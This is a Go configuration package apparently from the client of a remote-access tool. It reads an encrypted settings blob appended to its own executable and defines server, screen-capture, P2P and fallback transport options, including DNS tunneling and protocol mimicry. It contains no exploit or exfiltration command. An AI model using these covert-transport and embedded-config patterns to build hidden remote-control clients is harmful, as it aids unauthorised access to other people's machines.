package config

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"hash/crc32"
	"net/url"
	"os"
	"strings"
	"sync"
)

const (
	TrailerMagic       = "SPARKCFG"
	trailerVersion     = uint16(1)
	TrailerFooterSize  = 20
	ConfigBufferSize   = 2048
	trailerReservedVal = uint16(0)
)

var (
	rawConfigOnce sync.Once
	rawConfig     []byte
	rawConfigErr  error
)

var Commit = ``

type CaptureConfig struct {
	Mode          string   `json:"mode"`           // Preferred capture mode
	EnablePreDWM  bool     `json:"enable_pre_dwm"` // Allow pre-DWM shared surface capture
	FallbackOrder []string `json:"fallback_order"` // Explicit fallback order
	AdapterLUID   string   `json:"adapter_luid"`   // Optional adapter LUID for shared surface
}

// P2PSettings describe peer-to-peer defaults baked into the client config trailer.
type P2PSettings struct {
	Enable        bool     `json:"enable"`                   // Enable direct transport
	Target        string   `json:"target"`                   // Default peer ID to dial
	RendezvousURL string   `json:"rendezvous_url,omitempty"` // Optional rendezvous override
	STUNServers   []string `json:"stun_servers,omitempty"`   // Optional STUN servers for NAT detection
}

var Config struct {
	Secure bool   `json:"secure"`
	Host   string `json:"host"`
	Port   int    `json:"port"`
	Path   string `json:"path"`
	UUID   string `json:"uuid"`
	Key    string `json:"key"`

	// Transport fallback configuration (must match server generate.go clientCfg)
	EnableQUIC         bool   `json:"enable_quic"`          // Enable QUIC transport
	QUICPort           int    `json:"quic_port"`            // QUIC port (default: host port)
	EnableLongPoll     bool   `json:"enable_longpoll"`      // Enable long polling
	EnableDNS          bool   `json:"enable_dns"`           // Enable DNS tunneling
	DNSDomain          string `json:"dns_domain"`           // DNS domain for tunneling
	DNSServer          string `json:"dns_server"`           // DNS server address
	EnableMimicry      bool   `json:"enable_mimicry"`       // Enable protocol mimicry
	InsecureSkipVerify bool   `json:"insecure_skip_verify"` // Allow skipping TLS verification (default false)

	// P2P connection configuration (legacy top-level + preferred nested block)
	EnableP2P        bool         `json:"enable_p2p"`         // Enable P2P transport (legacy)
	P2PTarget        string       `json:"p2p_target"`         // Target peer ID for P2P (legacy)
	P2PRendezvousURL string       `json:"p2p_rendezvous_url"` // Rendezvous server URL (legacy)
	P2P              *P2PSettings `json:"p2p"`                // Nested settings (preferred)

	Capture CaptureConfig `json:"capture"`
}

type trailerFooter struct {
	Magic    [8]byte
	Version  uint16
	Reserved uint16
	Length   uint32
	CRC32    uint32
}

func GetBaseURL(ws bool) string {
	baseUrl := url.URL{
		Host: fmt.Sprintf(`%v:%d`, Config.Host, Config.Port),
		Path: Config.Path,
	}
	if ws {
		if Config.Secure {
			baseUrl.Scheme = `wss`
		} else {
			baseUrl.Scheme = `ws`
		}
	} else {
		if Config.Secure {
			baseUrl.Scheme = `https`
		} else {
			baseUrl.Scheme = `http`
		}
	}
	base := baseUrl.String()
	if strings.HasSuffix(base, `/`) {
		base = strings.TrimSuffix(base, `/`)
	}
	return base
}

// RawConfig returns the encrypted configuration payload (length + buffer) from the trailer.
func RawConfig() ([]byte, error) {
	rawConfigOnce.Do(func() {
		rawConfig, rawConfigErr = readTrailer()
	})
	if rawConfigErr != nil {
		return nil, rawConfigErr
	}
	if len(rawConfig) == 0 {
		return nil, errors.New("config trailer empty")
	}
	return rawConfig, nil
}

// readTrailer loads the config data appended to the executable.
func readTrailer() ([]byte, error) {
	exePath, err := os.Executable()
	if err != nil {
		return nil, err
	}
	return readTrailerFromPath(exePath)
}

// readTrailerFromPath reads the trailer payload from the provided binary path.
func readTrailerFromPath(path string) ([]byte, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	stat, err := file.Stat()
	if err != nil {
		return nil, err
	}
	if stat.Size() < TrailerFooterSize {
		return nil, errors.New("config trailer missing")
	}
	footerOffset := stat.Size() - TrailerFooterSize
	buf := make([]byte, TrailerFooterSize)
	if _, err = file.ReadAt(buf, footerOffset); err != nil {
		return nil, err
	}
	var footer trailerFooter
	if err = binary.Read(bytes.NewReader(buf), binary.LittleEndian, &footer); err != nil {
		return nil, err
	}
	if string(footer.Magic[:]) != TrailerMagic {
		return nil, errors.New("config trailer magic mismatch")
	}
	if footer.Version != trailerVersion {
		return nil, errors.New("config trailer version mismatch")
	}
	length := int64(footer.Length)
	if length <= 0 || length > footerOffset {
		return nil, errors.New("config trailer length invalid")
	}
	data := make([]byte, length)
	if _, err = file.ReadAt(data, footerOffset-length); err != nil {
		return nil, err
	}
	if crc32.ChecksumIEEE(data) != footer.CRC32 {
		return nil, errors.New("config trailer checksum mismatch")
	}
	return data, nil
}

// BuildTrailerFooter serializes a footer for the provided payload.
func BuildTrailerFooter(data []byte) []byte {
	footer := trailerFooter{
		Version:  trailerVersion,
		Reserved: trailerReservedVal,
		Length:   uint32(len(data)),
		CRC32:    crc32.ChecksumIEEE(data),
	}
	copy(footer.Magic[:], []byte(TrailerMagic))

	buf := &bytes.Buffer{}
	binary.Write(buf, binary.LittleEndian, footer)
	return buf.Bytes()
}
